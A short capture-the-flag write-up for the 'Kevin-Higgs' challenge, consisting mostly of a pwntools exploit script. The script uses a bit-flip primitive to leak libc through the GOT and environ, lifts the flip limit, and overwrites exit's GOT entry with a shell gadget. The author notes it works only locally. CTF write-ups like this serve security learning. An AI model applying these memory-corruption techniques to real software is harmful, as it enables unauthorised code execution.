# Kevin-Higgs
494


This thing is an abomination of code, and doesn't even work on remote, only local.

The libc version I used was the default libc on the server I was working on.

I didn't want to mess around with the libc versions anymore since I had already spent 3+ hours on it.

```python
from pwn import *



e = ELF("./kevin-higgs")
libc = ELF("./libc.so.6")

#context.log_level = "debug"


#p = remote("2020.redpwnc.tf", 31956)
p = process("./kevin-higgs", env={"NUMBER_OF_FLIPS":'2', "LD_PRELOAD":"./libc.so.6"})

#gdb.attach(p, '''break * 0x80493d6''')


p.recvline()
p.recvline()


def flip(addr, offset):
	p.recvuntil("):")
	p.sendline(hex(addr)[2:])
	p.recvuntil("):")
	p.sendline(str(offset))

def read(addr, byte_amt=4):
	d = ""

	for i in range(byte_amt):
		#print("reading from addr", hex(addr+i))
		flip(addr+i, 0)
		flip(addr+i, 0)
		p.recvuntil("new byte:")

		d = p.recvline().strip().strip("0x").zfill(2) + d

	#print(d)
	return int(d, 16)



def write_dword(addr, data):
	chunks = hex(data)[2:].zfill(8)
	chunks = [chunks[i:i+2] for i in range(0, len(chunks), 2)][::-1]

	tochange = []

	for i in range(4):
		print('--'*5)
		flip(addr+i, 0)
		flip(addr+i, 0)
		p.recvuntil("new byte:")
                d = p.recvline().strip().lstrip("0x").zfill(2)

		#print(d)
		t = []

		what_i_want = bin(int(chunks[i], 16))[2:].zfill(10)
		current = bin(int(d, 16))[2:].zfill(10)

		for j in range(10):
			a = what_i_want[j]
			b = current[j]

			if a != b:
				#print(a)
				#print(b)
				t.append(10-j-1)

		#print(t)
		for pos in t:
			flip(addr+i, pos)

print("exit got", hex(e.got["exit"]))
print("exit plt", hex(e.plt["exit"]))


flip(e.got["exit"], 4)
flip(e.got["exit"], 6)

flip(0x804c090, 0)	#flip debug
flip(0x804c090, 1)

#leak setvbuf
svb_addr = read(e.got["setvbuf"])

print("setvbuf addr", hex(svb_addr))


libc.address = svb_addr - 0x67a0c

print("libc address", hex(libc.address))
print("libc environ", hex(libc.sym["environ"]))

environ_pt_to = read(libc.sym["environ"])
print("libc environ points to", hex(environ_pt_to))

env_limitation  = environ_pt_to - 0xad8

print("env_limitation", hex(env_limitation))

flip(env_limitation+2,7)		# we can use an absurdly large amount of flips now

print("writing now...")

write_dword(e.got["exit"], libc.address + 0x3cbf0)


flip(0, 10)

p.interactive()
```
